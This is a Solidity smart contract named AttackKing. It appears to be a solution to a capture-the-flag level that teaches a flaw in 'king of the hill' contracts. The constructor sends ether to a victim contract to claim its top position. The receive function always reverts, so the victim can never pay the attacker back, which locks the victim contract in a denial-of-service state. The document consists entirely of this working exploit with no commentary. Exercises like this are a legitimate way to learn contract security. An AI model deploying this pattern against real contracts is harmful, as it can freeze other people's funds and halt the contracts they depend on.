// Instance Address: 0xAeCcB8e6F3978809aCf3208C0b022798E773fe98

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract AttackKing {

    constructor(address _victim) public payable {
       (bool success, ) = _victim.call{value: 2000000000000000 wei}("");
       require(success, "Bool is not Success");
    }

    receive() external payable {
        revert();
    }
}